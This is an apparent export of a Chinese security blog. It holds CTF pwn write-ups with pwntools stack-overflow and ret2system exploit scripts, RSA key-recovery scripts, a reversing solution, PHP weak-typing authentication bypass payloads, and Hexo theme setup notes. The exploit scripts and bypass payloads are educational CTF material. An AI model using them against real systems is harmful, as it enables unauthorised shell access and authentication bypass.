    <content type="text"><![CDATA[程序的内存结构 栈防护技术RELRO在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域，尽量减少可写的存储区域可使安全系数提高。GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术Relocation Read Only, 重定向只读，实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读。（参考RELRO技术细节） Stack栈溢出检查，用Canary金丝雀值是否变化来检测,Canary found表示开启。 金丝雀最早指的是矿工曾利用金丝雀来确认是否有气体泄漏，如果金丝雀因为气体泄漏而中毒死亡，可以给矿工预警。这里是一种缓冲区溢出攻击缓解手段：启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux将cookie信息称为Canary。 NX No Execute，栈不可执行，也就是windows上的DEP。 PIEposition-independent executables, 位置无关的可执行文件，也就是常说的ASLR(Address space layout randomization) 地址随机化，程序每次启动基址都随机。 DEP分析缓冲区溢出攻击，其根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，就目前来看重新去设计计算机体系结构基本上是不可能的，我们只能靠向前兼容的修补来减少溢出带来的损害，DEP就是用来弥补计算机对数据和代码混淆这一天然缺陷的。 DEP的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。DEP的主要作用是阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。硬件DEP需要CPU的支持，AMD和Intel都为此做了设计，AMD称之为No-Execute Page-Protection（NX），Intel称之为Execute Disable Bit（XD） 0x01 where did you born先checksec下，看下防护措施： 没有开启PIE。直接放到IDA里看下： 图中箭头处即是溢出点。分析下 第一次输入overflowme，如果等于1926就会退出，但是想要拿到flag，就需要overflowme的值为1926，那就很明显了，第一次输入的时候随便输个数只要不是1926就行，第二次输入v4 这个数组的时候，利用缓冲区溢出，将overflowme这个变量的值给覆盖成1926就行了，将1926转化为16进制为0x786。通过IDA看下数组和overflow这个变量之间的距离： 0x20-0x18，得到距离是8个字节。只要填充8个字节的垃圾数据，再将其后4个字节的空间覆盖为0x00000786就可以了。此时栈空间如下图： 脚本： 123456789from pwn import*a=remote('111.198.29.45',"50711")a=process('./when_did_you_born')a.recvuntil("What's Your Birth?")a.send('1998')a.recvuntil("What's Your Name?")payload='a'*8+p32(0x00000786)a.senline(payload)a.interactive() 0x02 hello_pwn用IDA查看源码： 可以看到unk_601068跟dword_60106c是连在一起的，所以只需要在read处溢出unk_601068覆盖dword_60106c为0x6E756161即可.exp: 123456from pwn import *p = process('./hello_pwn')p = remote("111.198.29.45","31004")payload = 4*'a' + p32(0x6E756161)p.sendline(payload)p.interactive() 0x03 level0首先用checksec查一下保护。几乎没开什么保护措施。 用ida反汇编。main函数就调用了两个函数。跟进第二个函数 找到溢出点，通过buf缓冲区。又找到函数callsystem()。只要控制程序返回到callsystem地址即可。找到callsystem地址。 脚本： 123456from pwn import*a=remote("111.198.29.45","53539")#a.recvuntil("Hello, World")payload=0x88*'a'+p64(0x400596)a.sendline(payload)a.interactive() 因为是64位程序，所以覆盖rbp和返回地址时都要用64位数据 0x04 level4 放到ida中发现了“/bin/sh”串，和system函数，可以利用== 所以只要在vuln函数返回时跳转到system函数，同时添加参数“/bin/sh”就可以实现exp: 1234567891011121314151617from pwn import *io = remote("pwn2.jarvisoj.com",9878)elf = ELF("./level2")sys_addr = elf.symbols["system"]bin_addr = elf.search("/bin/sh").next()payload = 'a'*(0x88 + 0x4) #辣鸡填充值payload += p32(sys_addr) #覆盖返回地址到system函数payload += p32(0xdeadbeef) #随意填写system函数调用结束的返回地址payload += p32(bin_addr) #system函数的参数，指向“/bin/sh”，实现调用io.recvline()io.sendline(payload)io.interactive()io.close() 12345678910111213141516171819 p = remote("111.198.29.45","50821")elf = ELF("./level2")sys_addr = elf.symbols["system"] bin_addr = elf.search("/bin/sh").next()payload = 'a'*0x8c payload += p32(sys_addr) payload += p32(0x12345678) payload += p32(bin_addr)'''system=0x08048320binsh=0x0804A024payload='a'*0x8cpayload+=p32(system)payload+=p32(0x12345678)payload+=p32(binsh)p.recvline() p.sendline(payload) p.interactive() 此时程序流程如图 相当于进行了两次溢出。第一次vulnable函数返回地址溢出为system函数地址，第二次system函数返回地址溢出为bin/sh地址 0x05 warmup-csaw 这个程序没有开启任何的保护，而且文件是动态链接却没有给出libc 丢进IDA看一下： 看到了熟悉的gets()函数，通常一看到这个函数就八成有缓冲区溢出漏洞，可以看出程序为v5开辟了40H的存储空间，所以输入长度超过40H即可造成溢出，再看sprint()函数 进入sub_40060D中看一下： 可以看到这个函数是获取flag的关键点，程序会打印出此函数的位置，即0x40060d，到这里思路就差不多明了了，我们需要控制溢出位置，把返回地址改为此函数的地址 exp: 123456from pwn import *a=remote(" "," ")a.recvuntil("&gt;")payload= 'a'*0x40+'a'*8+p64(0x000000000040060D)a.sendline(payload)a.interactive() 0x06 guss num 开启了栈溢出保护和地址随机化，是64位程序 猜随机数的一题，种子是seed[0]，循环10次，10次均对即可跳到sub_C3E函数执行system(“cat flag”)，checksec一波发现开启了canary,不能直接栈溢出到sub_C3E函数 发现var_30在栈中占0x20，可以覆盖到seed如果使输入的guessnumber，即v4等于随机数v6，即可cat flag。只要把seed覆盖为我们已知道的数字，那么生成的随机数也可以算出了。随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。对于该题目，我们将随机种子设置为0或1都可 关于ctype库与dll我们使用python标准库中自带的ctypes模块进行python和c的混合编程 libc共享库可以使用ldd查找 kk@ubuntu:~/Desktop/black/GFSJ/guess_num$ ldd guess_num linux-vdso.so.1 =&gt; (0x00007ffd3f5a0000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1e6c0b0000) /lib64/ld-linux-x86-64.so.2 (0x00007f1e6c67d000)也可以在脚本中通过elf文件查找 elf = ELF(&apos;./guess_num&apos;) libc = elf.libc exp如下: 1234567891011121314151617181920from pwn import *from ctypes import *a = remote('111.198.29.45',46063)a = process('./guess_num')elf = ELF('./guess_num')libc = elf.libclibc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")payload = "a" * 0x20 + p64(1)a.recvuntil('Please let me know your name!')a.sendline(payload)libc.srand(1)for i in range(10): num = str(libc.rand()%6+1) a.recvuntil('number:') a.sendline(num)a.interactive() 123456789101112131415from pwn import *from ctypes import*context.log_level = 'debug' p = process("./guess_num") libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")pay = "A"*0x20 + p64(1)p.sendlineafter("name:",pay)libc.srand(1)for i in range(10): p.sendlineafter("number:",str(libc.rand()%6 + 1))print p.recv() 0x07 dice game和上题类似。rand()生成的随机数和随机种子seed()有关，通过观察题目，可以发现存在溢出漏洞，通过输入可以覆盖到seed(),实现一个可预测的随机数列。 题目分析：这边就可以看到，buf覆盖0x40位就能覆盖到seed。buf 长度最长为 0x50 但是当输入大于 49 的时候不会被截断，所以我们只要覆盖到之前的 seed 就可以为所欲为了。同时注意到 seed 跟 buf 相差的偏移是 0x40，所以只要 68 个字符就可以溢出覆盖 seed 了。 sub_A20()如下，就是比较你输入的数是否和产生的随机数相等。 当回答正确50次时，会执行sub_B28这个函数，读取flag。 所以我们要做的就是，将seed覆盖掉，并且去预测生成的随机数。 1234567891011121314151617from pwn import *from ctypes import * context.log_level='debug'libc = cdll.LoadLibrary("libc.so.6")p = process('./dice_game') p = remote("111.198.29.45",58630)p.recvuntil(" let me know your name: ")p.send("A" * 0x40 + p64(1))libc.srand(1)for i in range(50): p.recvuntil("Give me the point(1~6): ") p.send(str(libc.rand()%6 + 1) + "\n") p.interactive() for i in range(50): a.append(libc.rand()%6+1) print(a) for i in a: p.recv() print(p.recv()) p.sendline(str(i)) p.interactive()0x08 cgpwn2拿到题目检查防护： 简单运行下： 放到ida里看下： 函数上面一大串代码都没啥用。主要是这里： 这个name是全局变量。 程序本身调用了system函数，但是没有现成的/bin/sh字符串，可以使用fgets将/bin/sh字符串读入bss区，然后将返回地址覆盖为system函数，参数布置为name的首地址。 bss段具有读写权限，我们可以将”/bin/sh”传到bss段，然后，调用system()函数，从bss段传入字符串我们通过传入name的值位”/bin/sh”,达到将值写入bss段的目的 s的栈空间是0x38,32位的内存是4位，所以，s加上ebp的空间大小是0x4242个 字符 就可以 返回我们gets 的返回地址 然后 我们 只需要 讲system 搞进去 然后输入 bin/sh 就可以了 但是别忘了 输入 system 的返回地址 （这个随便输入就行） 需要输入三个函数的返回地址，第一个是fgets，返回地址是bss_addr,目的是往bss段写入bin/sh,x00是为了补齐八位第二个返回地址是gets,返回地址是system_addr，目的是调用system函数第三个返回地址是system,返回地址随意 1234567891011from pwn import *p = process('./cgpwn2')p = remote("111.198.29.45","44496")system_addr = 0x8048420bss_addr = 0x804A080p.recvuntil('name\n')p.sendline("/bin/sh\x00")p.recvuntil('here:\n')payload = 42*'a' + p32(system_addr) + p32(0) + p32(bss_addr)p.sendline(payload)p.interactive()]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>CTF PWN</tag>
        <tag>二进制漏洞</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RSA加密算法]]></title>
    <url>%2F2019%2F10%2F08%2FRSA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[0x01 RSA介绍RSA加密算法是一种非对称加密算法。在公开密钥加密和电子商业中RSA被广泛使用。对极大整数做因数分解的难度决定了RSA算法的可靠性。换言之，对一极大整数做因数分解愈困难，RSA算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用RSA加密的信息的可靠性就肯定会极度下降。但找到这样的算法的可能性是非常小的。今天只有短的RSA钥匙才可能被强力方式解破。到目前为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。 0x02 RSA算法RSA的安全基于大数分解的难度。其公钥和私钥是一对大素数（100到200位十进制数或更大）的函数。从一个公钥和密文恢复出明文的难度，等价于分解两个大素数之积（这是公认的数学难题）。 RSA的公钥、私钥的组成，以及加密、解密的公式可见于下表： 算法描述：（1）选择一对不同的、足够大的素数p，q。 （2）计算n=pq。 （3）计算f(n)=(p-1)(q-1)，同时对p, q严加保密，不让任何人知道。 （4）找一个与f(n)互质的数e，且1&lt;e&lt;f(n)。 （5）计算d，使得de≡1 mod f(n)。这个公式也可以表达为d ≡e-1 mod f(n) （6）公钥KU=(e,n)，私钥KR=(d,n)。 （7）加密时，先将明文变换成0至n-1的一个整数M。若明文较长，可先分割成适当的组，然后再进行交换。设密文为C，则加密过程为 （8）解密过程为 0x03 python计算私钥已知p,q,e,求d 1234567import gmpy2p=473398607161q=4511491e=17phi=(p-1)*(q-1)d=long(gmpy2.invert(e,phi))print d 0x04 python解密已知p,q,e,c,求m 123456789101112import gmpy2n=73069886771625642807435783661014062604264768481735145873508846925735521695159e=65537p = 386123125371923651191219869811293586459q = 189239861511125143212536989589123569301assert n==p*qc=15116717704501623028903918131505510580599561357387431295289012193980554012811d=gmpy2.invert(e,(p-1)*(q-1))m=pow(c,d,n)print (m) 0x05 已知e,d,n求p,q123456789101112131415161718192021222324252627282930313233343536import random def gcd(a, b): if a &lt; b: a, b = b, a while b != 0: temp = a % b a = b b = temp return a def getpq(n,e,d): p = 1 q = 1 while p==1 and q==1: k = d * e - 1 g = random.randint ( 0 , n ) while p==1 and q==1 and k % 2 == 0: k /= 2 y = pow(g,k,n) if y!=1 and gcd(y-1,n)&gt;1: p = gcd(y-1,n) q = n/p return p,q def main(): n = 0xa66791dc6988168de7ab77419bb7fb0c001c62710270075142942e19a8d8c51d053b3e3782a1de5dc5af4ebe99468170114a1dfe67cdc9a9af55d655620bbab e = 0x10001 d = 0x123c5b61ba36edb1d3679904199a89ea80c09b9122e1400c09adcf7784676d01d23356a7d44d6bd8bd50e94bfc723fa87d8862b75177691c11d757692df8881 p,q = getpq(n,e,d) print &quot;p: &quot;+hex(p) print &quot;q: &quot;+hex(q) if __name__ == &apos;__main__&apos;: main() 0x06 公因数分解n12345678910111213def gcd(a, b): if a &lt; b: a, b = b, a while b != 0: temp = a % b a = b b = temp return an1=9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327n2=13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743print &quot;p: &quot;+str(gcd(n1,n2))print &quot;q1: &quot;+str(n1/gcd(n1,n2))print &quot;q2: &quot;+str(n2/gcd(n1,n2)) 0x07OpenSSL 使用PEM 文件格式存储证书和密钥。PEM 实质上是Base64 编码的二进制内容，再加上开始和结束行，如证书文件的—–BEGIN CERTIFICATE—–和—–END CERTIFICATE—–在这些标记外面可以有额外的信息，如编码内容的文字表示。 解题思路是：①使用openssl解密.pem中参数–&gt;②参数十六进制转换为十进制–&gt;③利用factor对大整数进行分解，得到p和q –&gt;④用rsatool生成私钥文件: private.pem–&gt;⑤用private.pem解密flag.enc 解析加密密钥openssl rsa -pubin -text -modulus -in pub.key openssl rsa -pubin -text -modulus -inwarmup -in pubkey.pem生成解密密钥rsatool： https://github.com/ius/rsatool python rsatool.py -o private.pem -e 65537 -p XXX-q XXX python rsatool.py -f PEM -o key.key -p 1 -q 1 -e 1 openssl rsautl -decrypt -inkey key.pem -in flag.enc -out flag脚本生成解密密钥12345678910111213141516171819202122# coding=utf-8import mathimport sysfrom Crypto.PublicKey import RSA keypair = RSA.generate(1024)keypair.p =keypair.q =keypair.e =keypair.n = keypair.p * keypair.qQn = long((keypair.p - 1) * (keypair.q - 1)) i = 1while (True): x = (Qn * i) + 1 if (x % keypair.e == 0): keypair.d = x / keypair.e break i += 1private = open(&apos;private.pem&apos;, &apos;w&apos;)private.write(keypair.exportKey())private.close() 解密openssl rsautl -decrypt -in flag.enc -inkey private.pem]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>CTF密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XCTF 逆向 re1-100]]></title>
    <url>%2F2019%2F10%2F08%2FXCTF-%E9%80%86%E5%90%91-re1-100%2F</url>
    <content type="text"><![CDATA[用ida（x64）打开，找到主函数main直接进行分析，找到以下代码： 这一堆的代码看上去就是检查一些东西的，比如说checkStringIsNumber()就是检查字符串是不是全部都是数字. 继续往下走 bufParentRead是我们输入的字符串，查看confuseKey函数： 这里的字符顺序有问题，将我们输入的分成4段然后重新组合，重新组合。我们就直接修改要比较的字符串就好了，变换一下顺序：53fc275d81053ed5be8cdaf29f59034938ae4efd]]></content>
      <categories>
        <category>CTF逆向</category>
      </categories>
      <tags>
        <tag>CTF 逆向</tag>
        <tag>逆向</tag>
        <tag>IDA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP弱类型]]></title>
    <url>%2F2019%2F10%2F07%2FPHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[0x01 什么是弱类型强类型语言，当你定义一个变量是某个类型，如果不经过代码显式转换（强制转化）过，它就永远都是这个类型，如果把它当做其他类型来用，就会报错 弱类型语言，你想把这个变量当做什么类型来用，就当做什么类型来用，语言的解析器会自动（隐式）转换。 0x02 弱类型整数大小比较1234$temp = $_GET['password'];is_numeric($temp)?die("no numeric"):NULL;if($temp&gt;1336)&#123;echo $flag; is_numeric() 函数用于检测变量是否为数字或数字字符串。如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE(PHP 版本要求：PHP 4, PHP 5, PHP 7) 在这里先判断是不是数字。然后再判断这个数字是不是大于1336。 可以用数组绕过、%00截断、添加其他字符PHP数组有一个缺陷就是大多数的函数都没有办法去判断数组。 http://123.206.87.240:9009/22.php?password[]=1 http://123.206.87.240:9009/22.php?password=9999a http://123.206.87.240:9009/22.php?password=9999%00 0x03 “==”和“===”php中有两种比较的符号 == 与 === 1234 &lt;?php$a = $b ;$a===$b ;?&gt; === 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较 == 在进行比较的时候，会先将字符串类型转化成相同，再比较。如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行 例子： 1234567891011在$a==$b;中$a=' ';$b=null //true$a=null;$b=true //true $a=0;$b='0' //true$a=0;$b='abcdef ' //true ($a===$b //false)var_dump("admin"==0); //truevar_dump("1admin"==1); //truevar_dump("admin1"==1) //falsevar_dump("admin1"==0) //truevar_dump("0e123456"=="0e4456789"); //true “admin”==0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0,和0相等 “1admin”==1 比较的时候会将1admin转化成数值,结果为1“admin1“被转化为0。当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。 “0e123456”==”0e456789”相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等 0x04 md5绕过（Hash比较缺陷）12345678910111213141516&lt;?phpif (isset($_GET['Username']) &amp;&amp; isset($_GET['password'])) &#123; $logined = true; $Username = $_GET['Username']; $password = $_GET['password']; if (!ctype_alpha($Username)) &#123;$logined = false;&#125; if (!is_numeric($password) ) &#123;$logined = false;&#125; if (md5($Username) != md5($password)) &#123;$logined = false;&#125; if ($logined)&#123; echo "successful"; &#125;else&#123; echo "login failed!"; &#125; &#125;?&gt; 意思：输入Username（字符串型）和password（数字型），并且两者md5相等，即可成功。 做法：0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过下列是md5开头是0e的字符串： 1234567891011121314151617181920212223242526QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020 s155964671a0e342768416822451524974117254469 s214587387a0e848240448830537924465865611904 s214587387a0e848240448830537924465865611904 s878926199a0e545993274517709034328855841020 s1091221200a0e940624217856561557816327384675 s1885207154a0e5093672134182067008420087635142406107080e462097431906509019562988736854 0x05 json绕过123456789101112131415&lt;?phpif (isset($_POST['message'])) &#123; $message = json_decode($_POST['message']); $key ="*********"; if ($message-&gt;key == $key) &#123; echo "flag"; &#125; else &#123; echo "fail"; &#125; &#125; else&#123; echo "~~~~"; &#125;?&gt; 输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，但是可以利用0==”admin”这种形式绕过 最终payload： message={“key”:0} 0x06 strcmp漏洞绕过strcmp是比较两个字符串，如果两者相等 返回0str1小于str2,返回负数 1234567891011&lt;?php $password="***************" if(isset($_POST['password']))&#123; if (strcmp($_POST['password'], $password) == 0) &#123; echo "Right!!!login success";n exit(); &#125; else &#123; echo "Wrong password.."; &#125;?&gt; 要求我们post一个password值，要与给定的password变量的值相等。 password[]=xxx可以绕过 。因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等。 0x07 “array_search”与is_array”绕过is_array:判断传入的是不是一个数组，array_search（x，$数组）:在数组中寻找与指定值(x)相等的值. 实例在数组中搜索键值 “red”，并返回它的键名： 1234&lt;?php$a=array("a"=&gt;"red","b"=&gt;"green","c"=&gt;"blue");echo array_search("red",$a);?&gt; array_search() 函数在数组中搜索某个键值，并返回对应的键名。详细说明 array_search() 函数与 in_array() 一样，在数组中查找一个键值。如果找到了该值，匹配元素的键名会被返回。如果没找到，则返回 false。 如果第三个参数 strict 被指定为 true，则只有在数据类型和值都一致时才返回相应元素的键名 1234567891011121314151617&lt;?phpif(!is_array($_GET['test']))&#123;exit();&#125;$test=$_GET['test'];for($i=0;$i&lt;count($test);$i++)&#123; if($test[$i]==="admin")&#123; echo "error"; exit(); &#125; $test[$i]=intval($test[$i]);&#125;if(array_search("admin",$test)===0)&#123; echo "flag";&#125;else&#123; echo "false";&#125;?&gt; array_search函数 类似于== 也就是$a==”admin” 当然是$a=0 当然如果第三个参数为true则就不能绕过 先判断传入的是不是数组，然后循环遍历数组中的每个值，并且数组中的每个值不能和admin相等，并且将每个值转化为int类型，再判断传入的数组是否有admin，有则返回flag payload: test[]=0可以绕过]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF Web</tag>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>弱类型</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo Next主题配置]]></title>
    <url>%2F2019%2F10%2F06%2FHexo-Next%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[添加评论功能可用的评论系统大概有： HyperComments：https://www.hypercomments.com （来自俄罗斯的评论系统，使用谷歌账号注册。） 来必力：https://livere.com （来自韩国，使用邮箱注册。） 畅言： http://changyan.kuaizhan.com （安装需要备案号。） Gitment： https://github.com/imsun/gitment （有点小bug，比如说每次需要手动初始化，登录时会跳到主页。。） Valine: https://github.com/xCss/Valine 来必力使用方法打开来必力官网：https://livere.com，注册，点击上方的安装，选择免费的city版本。并点击现在安装。 123456789101112131415161718&lt;!-- 来必力City版安装代码 --&gt;&lt;div id="lv-container" data-id="city" data-uid="*************"&gt; &lt;script type="text/javascript"&gt; (function(d, s) &#123; var j, e = d.getElementsByTagName(s)[0]; if (typeof LivereTower === 'function') &#123; return; &#125; j = d.createElement(s); j.src = 'https://cdn-city.livere.com/js/embed.dist.js'; j.async = true; e.parentNode.insertBefore(j, e); &#125;)(document, 'script'); &lt;/script&gt;&lt;noscript&gt; 为正常使用来必力评论功能请激活JavaScript&lt;/noscript&gt;&lt;/div&gt;&lt;!-- City版安装代码已完成 --&gt; 复制其中的uid字段。打开主题目录下的 blog/themes/next/_config.yml 配置文件，定位到 livere_uid 字段，粘贴上刚刚复制的UID。 Next主题背景设置添加背景在 NEXT 预留的自定义样式文件themes/next/source/css/-custom/custom.style中修改 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869// 添加背景图片body &#123; background:url(/images/background.jpg); background-repeat: no-repeat; background-attachment:fixed; background-position:50% 50%; background-size: cover; -webkit-background-size: cover; -o-background-size: cover; -moz-background-size: cover; -ms-background-size: cover; /*这是设置底部文字, 看个人需要修改*/ #footer &gt; div &gt; div &#123; color:#eee; &#125; /* .main-inner &#123; margin-top: 60px; padding: 60px 60px 60px 60px; background: #fff; opacity: 0.5; min-height: 500px;&#125;*//*.bg_content &#123;position: fixed;top: 0;z-index: -1;width: 100%;height: 100%;&#125;*///代码块复制按钮.highlight&#123; //方便copy代码按钮（btn-copy）的定位 position: relative;&#125;.btn-copy &#123; display: inline-block; cursor: pointer; background-color: #eee; background-image: linear-gradient(#fcfcfc,#eee); border: 1px solid #d5d5d5; border-radius: 3px; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; -webkit-appearance: none; font-size: 13px; font-weight: 700; line-height: 20px; color: #333; -webkit-transition: opacity .3s ease-in-out; -o-transition: opacity .3s ease-in-out; transition: opacity .3s ease-in-out; padding: 2px 6px; position: absolute; right: 5px; top: 5px; opacity: 0;&#125;.btn-copy span &#123; margin-left: 5px;&#125;.highlight:hover .btn-copy&#123; opacity: 1;&#125;&#125;// Custom styles. 透明背景内容部分在themes\next\source\css_schemes\Pisces_layout.styl 文件 .content-wrap 标签下 background: white修改为： 1background: rgba(255,255,255,0.3); //0.3是透明度 菜单栏在themes\next\source\css_schemes\Pisces_layout.styl 文件 .header-inner 标签下 background: white修改为： 1background: rgba(255,255,255,0.3); //0.3是透明度 站点概况在 themes\next\source\css_schemes\Pisces_sidebar.styl 文件 .sidebar-inner 标签下 background: white修改为： 1234567891011121314151617background: rgba(255,255,255,0.3); //0.3是透明度``` 然后修改博客根目录 themes\next\source\css\_schemes\Pisces\_layout.styl 文件 .sidebar 标签下 background: $body-bg-color修改为：``` bashbackground: rgba(255,255,255,0.3); //0.3是透明度``` #### 按钮背景themes\next\source\css\_common\components\post\post-button.styl 同上修改对应位置为 background: transparent;## next主题设置首页显示预览themes/next目录，用文本编辑器打开_config.yml文件 搜索"auto_excerpt",找到如下部分： ``` bash auto_excerpt: enable: false length: 150 把enable改为对应的false改为true Hexo添加标签和分类首先打开theme/next/_config.yml，找到如下配置，删除”categories”和“tags”前的注释符#。 123456789menu: home: / || home about: /about/ || user tags: /tags/ || tags categories: /categories/ || th archives: /archives/ || archive #schedule: /schedule/ || calendar #sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat 进入博客根目录下，执行如下两条命令： 12$ hexo create page tags$ hexo create page categories 打开要分类的文章，在文件头添加“tags”标签或“categories”进行分类。 12345678title: hexo 添加标签和分类 date: 2019-10-01 09:01:56categories: - hexo- tagstags:- hexo- tags 完成后hexo g,hexo s。 统计访客数在\themes\next_config.yml中找到busuanzi_count:并进行更改： 123456789101112131415busuanzi_count: # count values only if the other configs are false enable: true # custom uv span for the whole site site_uv: true site_uv_header: &lt;i class="fa fa-user"&gt;&lt;/i&gt; 访问人数 site_uv_footer: # custom pv span for the whole site site_pv: true site_pv_header: &lt;i class="fa fa-eye"&gt;&lt;/i&gt; 总访问量 site_pv_footer: 次 # custom pv span for one page only page_pv: true page_pv_header: &lt;i class="fa fa-file-o"&gt;&lt;/i&gt; 浏览 page_pv_footer: 次 添加文章结束标识 在路径 /themes/next/layout/_macro 中新建 passage-end-tag.swig 文件,并添加以下内容： 12345&lt;div&gt; &#123;% if not is_index %&#125; &lt;div style="text-align:center;color: #ccc;font-size:14px;"&gt;------ 本文结束------&lt;/div&gt; &#123;% endif %&#125;&lt;/div&gt; 打开 themes/next/layout/_macro/post.swig 文件,添加： 12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'passage-end-tag.swig' %&#125; &#123;% endif %&#125; &lt;/div&gt; 然后打开主题配置文件 _config.yml,在末尾添加： 12passage_end_tag:enabled: true 添加代码复制下载插件clipboard.js 。打开 themes/next/source/lib/ ,新建文件夹 clipboard。把下载 clipboard.js下的 src 文件夹下的文件拖动到 clipboard文件夹下。打开 themes/next/source/js/src/ ,新建文件 custom.js ,代码如下: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102//此函数用于创建复制按钮function createCopyBtns() &#123; var $codeArea = $("figure table"); //查看页面是否具有代码区域，没有代码块则不创建 复制按钮 if ($codeArea.length &gt; 0) &#123; //复制成功后将要干的事情 function changeToSuccess(item) &#123; $imgOK = $("#copyBtn").find("#imgSuccess"); if ($imgOK.css("display") == "none") &#123; $imgOK.css(&#123; opacity: 0, display: "block" &#125;); $imgOK.animate(&#123; opacity: 1 &#125;, 1000); setTimeout(function() &#123; $imgOK.animate(&#123; opacity: 0 &#125;, 2000); &#125;, 2000); setTimeout(function() &#123; $imgOK.css("display", "none"); &#125;, 4000); &#125;; &#125;; //创建 全局复制按钮，仅有一组。包含：复制按钮，复制成功响应按钮 //值得注意的是：1.按钮默认隐藏，2.位置使用绝对位置 position: absolute; (position: fixed 也可以，需要修改代码) $(".post-body").before('&lt;div id="copyBtn" style="opacity: 0; position: absolute;top:0px;display: none;line-height: 1; font-size:1.5em"&gt;&lt;span id="imgCopy" &gt;&lt;i class="fa fa-paste fa-fw"&gt;&lt;/i&gt;&lt;/span&gt;&lt;span id="imgSuccess" style="display: none;"&gt;&lt;i class="fa fa-check-circle fa-fw" aria-hidden="true"&gt;&lt;/i&gt;&lt;/span&gt;'); //创建 复制 插件，绑定单机时间到 指定元素，支持JQuery var clipboard = new Clipboard('#copyBtn', &#123; target: function() &#123; //返回需要复制的元素内容 return document.querySelector("[copyFlag]"); &#125;, isSupported: function() &#123; //支持复制内容 return document.querySelector("[copyFlag]"); &#125; &#125;); //复制成功事件绑定 clipboard.on('success', function(e) &#123; //清除内容被选择状态 e.clearSelection(); changeToSuccess(e); &#125;); //复制失败绑定事件 clipboard.on('error', function(e) &#123; console.error('Action:', e.action); console.error('Trigger:', e.trigger); &#125;); //鼠标 在复制按钮上滑动和离开后渐变显示/隐藏效果 $("#copyBtn").hover( function() &#123; $(this).stop(); $(this).css("opacity", 1); &#125;, function() &#123; $(this).animate(&#123; opacity: 0 &#125;, 2000); &#125; ); &#125;&#125;//感应鼠标是否在代码区$("figure").hover( function() &#123; //-------鼠标活动在代码块内 //移除之前含有复制标志代码块的 copyFlag $("[copyFlag]").removeAttr("copyFlag"); //在新的（当前鼠标所在代码区）代码块插入标志：copyFlag $(this).find(".code").attr("copyFlag", 1); //获取复制按钮 $copyBtn = $("#copyBtn"); if ($copyBtn.lenght != 0) &#123; //获取到按钮的前提下进行一下操作 //停止按钮动画效果 //设置为 显示状态 //修改 复制按钮 位置到 当前代码块开始部位 //设置代码块 左侧位置 $copyBtn.stop(); $copyBtn.css("opacity", 0.8); 